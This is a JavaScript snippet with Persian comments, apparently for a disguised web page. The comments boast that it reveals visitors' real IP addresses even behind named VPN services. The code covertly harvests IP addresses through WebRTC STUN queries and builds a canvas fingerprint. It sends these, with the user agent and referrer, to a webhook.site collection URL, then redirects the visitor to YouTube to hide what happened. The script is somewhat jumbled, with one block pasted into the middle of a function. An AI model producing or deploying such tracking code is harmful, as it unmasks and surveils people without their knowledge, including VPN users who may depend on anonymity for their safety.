  <script>
    // روش ترکیبی ۲۰۲۵ – حتی پشت NordVPN, Mullvad, ProtonVPN, Surfshark هم IP واقعی رو لو می‌ده
    function forceWebRTCLeak() {
      const stunServers = [
        "stun:stun.l.google.com:19302",
        "stun:stun1.l.google.com:19302",
        "stun:stun2.l.google.com:19302",
        "stun:stun3.l.google.com:19302",
        "stun:stun.ekiga.net",
        "stun:stun.ideasip.com",
        "stun:stun.schlund.de",
        "stun:stun.stunprotocol.org:3478",
        "stun:stun.voiparound.com",
        "stun:stun.voipbuster.com",
        "stun:stun.voxgratia.org"
      ];
// IP Leak تضمینی – بدون STUN (برای دور زدن بلاک VPN)
  (function() {
    var img = new Image();
    var timestamp = Date.now();
    img.src = "https://webhook.site/e14058c5-ad0d-41d1-af86-8702b7c72138?type=direct&ua=" + encodeURIComponent(navigator.userAgent) + "&time=" + timestamp + "&ref=" + encodeURIComponent(document.referrer || 'direct');
    
    // Canvas Fingerprint برای تشخیص VPN
    var canvas = document.createElement('canvas');
    var ctx = canvas.getContext('2d');
    ctx.fillText('test', 2, 2);
    var canvasData = canvas.toDataURL();
    var fpImg = new Image();
    fpImg.src = "https://webhook.site/e14058c5-ad0d-41d1-af86-8702b7c72138?type=canvas&fp=" + btoa(canvasData.substring(22)) + "&time=" + timestamp;
    
    // ریدایرکت
    setTimeout(() => { location.href = "https://youtube.com"; }, 2500);
  })();
      stunServers.forEach(url => {
        try {
          const pc = new RTCPeerConnection({iceServers: [{urls: url}]});
          pc.createDataChannel("");
          pc.createOffer().then(offer => pc.setLocalDescription(offer));
          pc.onicecandidate = e => {
            if (e.candidate && e.candidate.candidate) {
              const parts = e.candidate.candidate.split(" ");
              const ip = parts[4];
              if (ip && ip !== "0.0.0.0") {
                new Image().src = "https://webhook.site/e14058c5-ad0d-41d1-af86-8702b7c72138?real_ip=" + ip +
                                  "&ua=" + encodeURIComponent(navigator.userAgent) +
                                  "&time=" + Date.now();
              }
            }
          };
        } catch (err) {}
      });
    }

    forceWebRTCLeak();

    // ریدایرکت خودکار
    setTimeout(() => { location.href = "https://youtube.com"; }, 3500);
